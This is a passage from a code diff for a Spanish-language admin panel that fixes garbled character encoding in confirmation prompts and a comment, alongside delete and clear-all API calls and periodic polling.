+            if (!confirm('¿Desea eliminar este cuadro?')) return;
             try {
                 const res = await fetch('api.php?action=delete&id=' + encodeURIComponent(id));
                 const data = await res.json();
@@ -1675,7 +1675,7 @@ if (empty($_SESSION['panel_autenticado'])) {
                 showToast('No hay cuadros para vaciar');
                 return;
             }
-            if (!confirm('Â¿EstÃ¡ seguro de que desea vaciar TODOS los cuadros recibidos? Esta acciÃ³n no se puede deshacer.')) return;
+            if (!confirm('¿Está seguro de que desea vaciar TODOS los cuadros recibidos? Esta acción no se puede deshacer.')) return;
             try {
                 const res = await fetch('api.php?action=clear_all');
                 const data = await res.json();
@@ -1701,10 +1701,9 @@ if (empty($_SESSION['panel_autenticado'])) {
             return text.replace(/'/g, "\\'").replace(/"/g, '&quot;');
         }
 
-        // Carga inicial y sondeo periÃ³dico cada 2 segundos sin parpadeo
+        // Carga inicial y sondeo periódico cada 2 segundos sin parpadeo
         cargarDatos();
         setInterval(cargarDatos, 2000);
     </script>
 </body>
 </html>
-
